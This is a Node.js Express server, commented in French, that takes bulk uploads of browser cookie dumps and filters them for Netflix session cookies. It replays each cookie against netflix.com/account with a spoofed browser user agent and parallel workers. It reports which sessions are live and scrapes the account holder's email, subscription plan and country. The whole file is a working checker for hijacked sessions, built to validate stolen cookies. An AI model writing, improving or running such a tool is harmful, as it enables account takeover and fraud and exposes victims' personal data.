'use strict';

const path = require('path');
const fs = require('fs');
const express = require('express');

const PORT = Number(process.env.PORT) || 3000;
const CONCURRENCY = Math.max(1, Number(process.env.CHECK_CONCURRENCY) || 5);
const TIMEOUT_MS = Math.max(3000, Number(process.env.CHECK_TIMEOUT_MS) || 20000);
const ROOT = __dirname;

const USER_AGENT =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '30mb' }));
app.use(express.text({ type: ['text/plain', 'text/csv'], limit: '30mb' }));

/* ------------------------------------------------------------------ */
/* Parsing                                                            */
/* ------------------------------------------------------------------ */

function splitJsonCookies(data) {
  const out = [];
  if (!data) return out;
  if (Array.isArray(data)) {
    for (const item of data) {
      if (item && typeof item === 'object' && item.name) {
        out.push(String(item.name) + '=' + String(item.value == null ? '' : item.value));
      } else if (typeof item === 'string') {
        out.push(item);
      }
    }
    return out;
  }
  if (typeof data === 'object') {
    if (data.cookies) return splitJsonCookies(data.cookies);
    if (data.name) return splitJsonCookies([data]);
  }
  return out;
}

function parseCookies(text) {
  const found = [];
  const source = String(text || '').replace(/^\uFEFF/, '').trim();
  if (!source) return found;

  if (source.startsWith('[') || source.startsWith('{')) {
    try {
      const parsed = JSON.parse(source);
      const fromJson = splitJsonCookies(parsed);
      if (fromJson.length) return fromJson;
    } catch (error) {
      /* on retombe sur le parsing ligne par ligne */
    }
  }

  for (const rawLine of source.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (!line || line.startsWith('#')) continue;

    const columns = line.split('\t');
    if (columns.length >= 7) {
      const name = columns[5].trim();
      const value = columns.slice(6).join('\t').trim();
      if (name) found.push(name + '=' + value);
      continue;
    }

    if (line.includes('=')) found.push(line.replace(/;\s*$/, ''));
  }

  return found;
}

function isUsable(cookie) {
  return /(^|;\s*)(Secure)?NetflixId=/.test(cookie);
}

function cookieKey(cookie) {
  const parts = cookie.split(';').map((part) => part.trim().split('=')[0]);
  return parts.filter(Boolean).sort().join('|');
}

function dedupe(list) {
  const seen = new Set();
  const out = [];
  for (const cookie of list) {
    const cleaned = String(cookie || '').replace(/\s+/g, ' ').trim();
    if (!cleaned || !isUsable(cleaned)) continue;
    const key = cookieKey(cleaned);
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(cleaned);
  }
  return out;
}

/* ------------------------------------------------------------------ */
/* Vérification Netflix                                               */
/* ------------------------------------------------------------------ */

function pick(html, patterns) {
  for (const pattern of patterns) {
    const match = html.match(pattern);
    if (match && match[1]) return match[1];
  }
  return null;
}

async function checkCookie(cookie) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), TIMEOUT_MS);

  try {
    const response = await fetch('https://www.netflix.com/account', {
      method: 'GET',
      redirect: 'manual',
      signal: controller.signal,
      headers: {
        'User-Agent': USER_AGENT,
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        Cookie: cookie,
        'Upgrade-Insecure-Requests': '1'
      }
    });

    const location = response.headers.get('location') || '';
    if (response.status >= 300 && response.status < 400) {
      if (/login|signup|clearcookies/i.test(location)) {
        return { status: 'invalid', message: 'Redirigé vers la page de connexion' };
      }
      return { status: 'invalid', message: 'Redirection ' + response.status };
    }

    if (response.status === 401 || response.status === 403) {
      return { status: 'invalid', message: 'Accès refusé (' + response.status + ')' };
    }

    if (!response.ok) {
      return { status: 'error', message: 'HTTP ' + response.status };
    }

    const html = await response.text();
    const looksLoggedOut = /id="loginPage"|name="signIn"|data-uia="login-form"/i.test(html);

    if (looksLoggedOut) {
      return { status: 'invalid', message: 'Session expirée' };
    }

    const email = pick(html, [
      /"emailAddress"\s*:\s*"([^"]+)"/,
      /"email"\s*:\s*"([^"@]+@[^"]+)"/,
      /data-uia="account-email"[^>]*>([^<]+)</
    ]);

    const planRaw = pick(html, [
      /"planName"\s*:\s*"([^"]+)"/,
      /"currentPlan"\s*:\s*"([^"]+)"/,
      /"localizedPlanName"\s*:\s*"([^"]+)"/,
      /"plan"\s*:\s*"([A-Za-z+ ]{3,20})"/
    ]);

    const country = pick(html, [
      /"currentCountry"\s*:\s*"([A-Z]{2})"/,
      /"countryOfSignup"\s*:\s*"([A-Z]{2})"/
    ]);

    return {
      status: 'valid',
      message: 'Session active',
      email: email || null,
      plan: planRaw || null,
      country: country || null
    };
  } catch (error) {
    if (error && error.name === 'AbortError') {
      return { status: 'error', message: 'Délai dépassé' };
    }
    return { status: 'error', message: 'Erreur réseau' };
  } finally {
    clearTimeout(timer);
  }
}

async function runPool(jobs, worker, limit) {
  const results = new Array(jobs.length);
  let cursor = 0;

  async function runner() {
    while (cursor < jobs.length) {
      const index = cursor++;
      results[index] = await worker(jobs[index], index);
    }
  }

  const size = Math.min(limit, jobs.length);
  await Promise.all(Array.from({ length: size }, runner));
  return results;
}

/* ------------------------------------------------------------------ */
/* Routes                                                             */
/* ------------------------------------------------------------------ */

app.get('/api/health', (req, res) => {
  res.json({ ok: true, uptime: Math.round(process.uptime()) });
});

app.post('/api/check', async (req, res) => {
  const body = req.body;
  let incoming = [];

  if (Array.isArray(body)) {
    incoming = body;
  } else if (body && Array.isArray(body.cookies)) {
    incoming = body.cookies;
  } else if (typeof body === 'string') {
    incoming = parseCookies(body);
  } else if (body && typeof body.text === 'string') {
    incoming = parseCookies(body.text);
  }

  const cookies = dedupe(incoming);
  if (!cookies.length) {
    return res.status(400).json({ error: 'Aucun cookie Netflix exploitable reçu.' });
  }

  const results = await runPool(cookies, async (cookie, index) => {
    const outcome = await checkCookie(cookie);
    return Object.assign({ index }, outcome);
  }, CONCURRENCY);

  res.json({ total: cookies.length, results });
});

app.post('/api/parse', (req, res) => {
  const body = req.body;
  const text = typeof body === 'string' ? body : (body && body.text) || '';
  const cookies = dedupe(parseCookies(text));
  res.json({ total: cookies.length, cookies });
});

/* ------------------------------------------------------------------ */
/* Statique                                                           */
/* ------------------------------------------------------------------ */

const publicDir = path.join(ROOT, 'public');
if (fs.existsSync(publicDir)) {
  app.use(express.static(publicDir, { extensions: ['html'] }));
}
app.use(express.static(ROOT, { extensions: ['html'], index: ['index.html'] }));

app.use((req, res) => {
  res.status(404).sendFile(path.join(ROOT, 'index.html'));
});

app.listen(PORT, () => {
  console.log('netflixcookieproject démarré sur http://localhost:' + PORT);
});
